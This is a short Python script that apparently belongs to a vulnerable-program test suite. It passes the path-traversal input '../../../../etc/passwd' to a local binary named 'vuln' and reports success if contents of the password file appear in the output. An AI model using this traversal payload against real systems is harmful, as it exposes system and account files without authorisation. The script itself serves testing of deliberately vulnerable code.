#!/usr/bin/env python3
"""Tier-1 path-traversal / C++ — same as C variant."""
import os
import subprocess
import sys


def main() -> int:
    binary = sys.argv[1] if len(sys.argv) > 1 else os.path.join("build", "vuln")
    proc = subprocess.run([binary, "../../../../etc/passwd"], capture_output=True, timeout=5)
    out = proc.stdout.decode(errors="replace")
    leaked = "root:" in out or "/bin/" in out
    print(f"returncode={proc.returncode} leaked={leaked}")
    return 0 if leaked else 1


if __name__ == "__main__":
    sys.exit(main())
